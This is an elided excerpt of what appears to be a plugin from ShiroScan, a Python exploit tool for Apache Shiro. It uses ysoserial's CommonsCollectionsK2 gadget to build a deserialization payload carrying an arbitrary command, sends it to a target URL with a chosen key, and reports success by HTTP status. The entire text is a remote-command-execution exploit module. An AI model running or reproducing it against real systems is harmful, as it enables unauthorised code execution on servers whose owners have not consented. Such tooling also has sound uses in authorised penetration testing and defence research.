...
from cve.Shiro.ShiroScan_master.moule.main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = './cve/Shiro/ShiroScan_master/moule/ysoserial.jar'

@Idea.plugin_register('Class31:CommonsCollectionsK2')
class CommonsCollectionsK2(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollectionsK2', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****CommonsCollectionsK2模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****CommonsCollectionsK2模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
